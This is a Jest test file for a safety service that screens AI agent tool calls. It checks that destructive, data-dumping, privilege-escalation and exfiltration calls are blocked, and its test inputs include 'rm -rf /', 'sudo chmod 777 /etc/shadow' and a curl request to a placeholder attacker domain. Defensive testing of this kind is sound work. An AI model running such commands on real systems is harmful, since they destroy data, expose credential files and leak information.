import { SentinelService } from './sentinel.service';

describe('Sentinel Safety Gate: Tool Call Policy & Enforcing NO_TOOLS (sentinel-tool-call)', () => {
  let sentinel: SentinelService;

  beforeAll(() => {
    sentinel = new SentinelService();
  });

  it('should block destructive shell commands', () => {
    const result = sentinel.scan_tool_call('shell', { cmd: 'rm -rf /' });

    expect(result.allowed).toBe(false);
    expect(result.risk).toBe('CRITICAL');
    expect(result.blockReason).toContain('NO_TOOLS');
  });

  it('should block database dumping attempts', () => {
    const result = sentinel.scan_tool_call('database', { query: 'SELECT * FROM users' });

    expect(result.allowed).toBe(false);
    expect(result.risk).toBe('CRITICAL');
  });

  it('should block privilege escalation tool calls', () => {
    const result = sentinel.scan_tool_call('exec', { command: 'sudo chmod 777 /etc/shadow' });

    expect(result.allowed).toBe(false);
    expect(result.risk).toBe('CRITICAL');
  });

  it('should block curl exfiltration commands', () => {
    const result = sentinel.scan_tool_call('curl', { url: 'https://exfiltrate.attacker.com/data' });

    expect(result.allowed).toBe(false);
    expect(result.risk).toBe('CRITICAL');
  });
});
